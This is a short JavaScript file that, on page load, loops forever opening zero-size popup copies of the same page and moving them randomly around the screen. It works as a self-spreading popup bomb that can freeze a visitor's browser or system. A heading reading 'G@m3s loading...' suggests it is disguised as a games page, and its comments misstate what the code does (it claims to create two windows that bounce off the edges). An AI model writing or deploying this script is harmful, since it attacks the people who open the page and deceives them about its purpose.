function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function moveWindows() {
  // Create two windows
  while (true) {
    let newWindow = window.open(location.href, "_blank", "width=0,height=0");

    if (!newWindow || newWindow.closed || typeof newWindow.closed == "undefined") {
      document.querySelector("h1").innerHTML =
        "G@m3s loading...";
      clearInterval(interval);
    }

    // Set the initial positions and velocities of the windows
    let windowX = Math.random() * window.screen.availWidth;
    let windowY = Math.random() * window.screen.availHeight;

    // Move the windows diagonally and make them bounce off the edges
    const frame = function () {
      // Move window 1
      windowX = Math.random() * window.screen.availWidth;
      windowY = Math.random() * window.screen.availHeight;
      newWindow.moveTo(windowX, windowY);

      requestAnimationFrame(frame);
    };
    frame();
    // sleep(10);
  }
}

moveWindows();